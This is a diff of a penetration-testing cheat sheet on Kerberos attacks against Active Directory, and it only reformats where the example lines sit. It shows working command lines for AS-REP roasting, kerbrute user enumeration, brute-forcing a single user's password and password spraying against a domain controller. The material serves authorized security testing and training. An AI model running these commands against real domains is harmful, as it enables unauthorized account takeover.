@@ -123,19 +123,22 @@ python GetNPUsers.py $DOMAIN/$USER:$PWD -dc-ip $HOST
 ```
 kerbrute userenum --dc $HOST -d $DOMAIN $WORDLIST
 ```
-Example : `kerbrute userenum --dc 10.10.10.10 -d domain.local /opt/SecLists/Usernames/xato-net-10-million-usernames-dup.txt`  
+Example :  
+`kerbrute userenum --dc 10.10.10.10 -d domain.local /opt/SecLists/Usernames/xato-net-10-million-usernames-dup.txt`  
 
 **Bruteforce user :**  
 ```
 kerbrute bruteuser --dc $HOST -d $DOMAIN $WORDLIST $USER
 ```
-Example : `kerbrute bruteuser --dc 10.10.10.10 -d domain.local /usr/share/wordlists/rockyou.txt alice`  
+Example :  
+`kerbrute bruteuser --dc 10.10.10.10 -d domain.local /usr/share/wordlists/rockyou.txt alice`  
 
 **Password spray :**  
 ```
 kerbrute passwordspray --dc $HOST -d $DOMAIN $FILE_USERS $PASSWORD
 ```
-Example : `kerbrute passwordspray --dc 10.10.10.10 -d domain.local domain_users.txt Password123!`  
+Example :  
+`kerbrute passwordspray --dc 10.10.10.10 -d domain.local domain_users.txt Password123!`  
 
 
 ## Vulnerabilities
